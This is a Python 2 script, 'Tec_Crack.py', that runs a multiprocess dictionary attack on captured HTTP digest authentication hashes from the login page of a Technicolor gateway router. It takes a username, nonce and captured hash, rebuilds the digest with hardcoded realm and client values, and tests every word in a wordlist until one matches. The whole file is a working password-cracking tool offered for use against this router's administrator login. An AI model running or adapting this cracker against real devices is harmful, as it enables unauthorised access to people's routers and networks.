#!/usr/bin/env python

import hashlib, os, time, math, sys, getopt
from hashlib import md5
from multiprocessing import Pool, cpu_count, Manager

def screen_clear(): # Small function for clearing the screen on Unix or Windows
	if os.name == 'nt':
		return os.system('cls')
	else:
		return os.system('clear')

user = ""
nonce = ""
hash = ""
file = ""

def usage(): # any incorrect input will display the usage instructions
	screen_clear()
	print """Tec_Crack.py

=======
Usage
=======

	Tec_Crack.py -u <USER> -n <NONCE> -h <HASH> -w <FILE>

=======
Options
=======

	-u,  --user=<USER>	Username
	-n,  --nonce=<NONCE>	Random nonce, unique to each login attempt
	-h,  --hash=<HASH>	MD5 Hash to be cracked
	-w,  --wordlist=<FILE>	Address of Wordlist file
	"""
	sys.exit(2)

try:
	opts, args = getopt.getopt(sys.argv[1:], "u:n:h:w:", ["user=", "nonce=", "hash=", "wordlist="])
except getopt.GetoptError:
	usage()

for opt, arg in opts:
	if opt in ("-u", "--user"):
		user = arg
	if opt in ("-n", "--nonce"):
		nonce = arg
	if opt in ("-h", "--hash"):
		hash = arg
	if opt in ("-w", "--wordlist"):
		file = arg

if not user or not nonce or not hash or not file: # makes sure all variables are filled
	usage()


cores = cpu_count() # Var containing number of cores (Threads)

screen_clear()

print ""
print "Welcome to the Technicolor md5 cracker"
print ""

time1 = time.time() # Begins the 'Clock' for timing

realm = "Technicolor Gateway" # These 3 variables dont appear to change
qop = "auth"
uri = "/login.lp"

HA2 = md5("GET" + ":" + uri).hexdigest() # This hash doesn't contain any changing variables so doesn't need to be recalculated

file = open(file, 'r') # Opens the wordlist file
wordlist = file.readlines() # This enables us to use len()
length = len(wordlist)

print "Cracking the password for \"" + user + "\" using " + str(length) + " words with " + str(cores) + " Threads"

break_points = []  # List that will have start and stopping points
for i in range(cores):  # Creates start and stopping points based on length of word list
    break_points.append({"start":int(math.ceil((length+0.0)/cores * i)), "stop":int(math.ceil((length+0.0)/cores * (i + 1)))})

finished = False

def finisher(answer):
	if answer:
		global finished
		finished = True
		p.terminate()

def pwd_find(start, stop):
	for number in range(start, stop):
		word = (wordlist[number])
		pwd = word.replace("\n","") # Removes newline character
		HA1 = md5(user + ":" + realm + ":" + pwd).hexdigest()
		hidepw = md5(HA1 + ":" + nonce +":" + "00000001" + ":" + "xyz" + ":" + qop + ":" + HA2).hexdigest()
		if hidepw == hash:
			screen_clear()
			time2 = time.time() # stops the 'Clock'
			timetotal = math.ceil(time2 - time1) # Calculates the time taken
			print "\"" + pwd + "\"" + " = " + hidepw + " (in " + str(timetotal) + " seconds)"
			print ""
			return True
	if True:
		return False

if __name__ == '__main__':  # Added this because the multiprocessor module sometimes acts funny without it.

    p = Pool(cores)  # Number of processes to create.
    for i in break_points:  # Cycles though the breakpoints list created above.
        a = p.apply_async(pwd_find, kwds=i, args=tuple(), callback=finisher)  # This will start the separate processes.
    p.close() # Prevents any more processes being started
    p.join() # Waits for worker process to end

if finished == False:
	time2 = time.time() # Stops the 'Clock'
	totaltime = math.ceil(time2 - time1) # Calculates the time taken
	screen_clear()
	print "Sorry your password was not found (in " + str(totaltime) + " seconds) out of " + str(length) + " words"
	print ""

end = raw_input("Hit enter to exit")
file.close() # Closes the wordlist file
screen_clear()
sys.exit(2)
